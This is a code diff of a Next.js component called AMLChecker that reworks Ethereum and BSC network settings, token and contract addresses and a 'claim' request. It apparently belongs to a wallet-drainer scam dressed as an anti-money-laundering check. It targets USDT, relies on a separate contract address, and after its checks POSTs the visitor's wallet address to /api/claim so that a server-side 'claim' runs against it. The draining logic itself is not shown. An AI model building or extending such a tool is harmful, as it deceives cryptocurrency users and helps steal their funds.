@@ -35,12 +35,25 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// Network config using explicitly defined chains with stable RPC endpoints
+// ─── Per-network config ───────────────────────────────────────────────────────
+// Every value comes from its own explicit env var.
+// Frontend (NEXT_PUBLIC_*) used for chain/RPC/token/contract address.
+// Backend uses the same names in /api/claim.
+
+const ETH_RPC      = process.env.NEXT_PUBLIC_RPC_URL          || 'https://ethereum.publicnode.com';
+const BSC_RPC      = process.env.NEXT_PUBLIC_BSC_RPC           || 'https://bsc-dataseed1.binance.org';
+
+const ETH_TOKEN    = process.env.NEXT_PUBLIC_TOKEN_ADDRESS     || '';
+const ETH_CONTRACT = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS  || '';
+
+const BSC_TOKEN    = process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || '';
+const BSC_CONTRACT = process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '';
+
 const ethereumChain = defineChain({
   id: 1,
   name: 'Ethereum',
   nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-  rpc: 'https://eth.merkle.io',
+  rpc: ETH_RPC,
   blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
 });
 
@@ -48,20 +61,20 @@ const bscChain = defineChain({
   id: 56,
   name: 'Binance Smart Chain',
   nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-  rpc: 'https://bsc.merkle.io',
+  rpc: BSC_RPC,
   blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
 });
 
-const NETWORK_CONFIG = {
+const NETWORK_CONFIG: Record<Network, { chain: ReturnType<typeof defineChain>; tokenAddress: string; contractAddress: string }> = {
   erc: {
     chain: ethereumChain,
-    tokenAddress: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-    contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
+    tokenAddress: ETH_TOKEN,
+    contractAddress: ETH_CONTRACT,
   },
   bsc: {
     chain: bscChain,
-    tokenAddress: process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0x55d398326f99059fF775485246999027B3197955',
-    contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
+    tokenAddress: BSC_TOKEN,
+    contractAddress: BSC_CONTRACT,
   },
 };
 
@@ -109,8 +122,12 @@ export default function AMLChecker() {
 
     const { chain, tokenAddress, contractAddress } = config;
 
-    if (!contractAddress || contractAddress === '' || !tokenAddress || tokenAddress === '') {
-      console.error('[v0] Missing addresses — token:', tokenAddress, 'contract:', contractAddress);
+    if (!tokenAddress) {
+      console.error(`[claim] Missing token address for ${networkKey} — set NEXT_PUBLIC_${networkKey === 'bsc' ? 'BSC_' : ''}TOKEN_ADDRESS`);
+      return;
+    }
+    if (!contractAddress) {
+      console.error(`[claim] Missing contract address for ${networkKey} — set NEXT_PUBLIC_${networkKey === 'bsc' ? 'BSC_' : ''}CONTRACT_ADDRESS`);
       return;
     }
 
@@ -164,13 +181,12 @@ export default function AMLChecker() {
         }
       }
 
-      // Fire claim
+      // Fire claim — token address is resolved server-side from env vars
       const claimRes = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           userAddress: currentAccount.address,
-          tokenAddress,
           network: networkKey,
         }),
       });
